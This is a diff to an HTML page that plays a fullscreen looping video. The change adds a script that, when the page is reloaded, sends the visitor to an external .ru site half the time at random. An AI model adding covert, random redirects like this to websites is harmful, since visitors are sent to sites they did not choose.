@@ -7,6 +7,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 
+<script>
+    const nav = performance.getEntriesByType("navigation")[0];
+
+    if (nav && nav.type === "reload") {
+        if (Math.random() < 0.5) {
+            window.location.href = "https://www.cardlyapp.ru/";
+        }
+    }
+</script>
+
 <body style="margin:0; overflow:hidden; background:#000;">
     <video autoplay loop muted playsinline
         style="position:fixed;top:50%;left:50%;height:100vh;width:auto;transform:translate(-50%,-50%);">
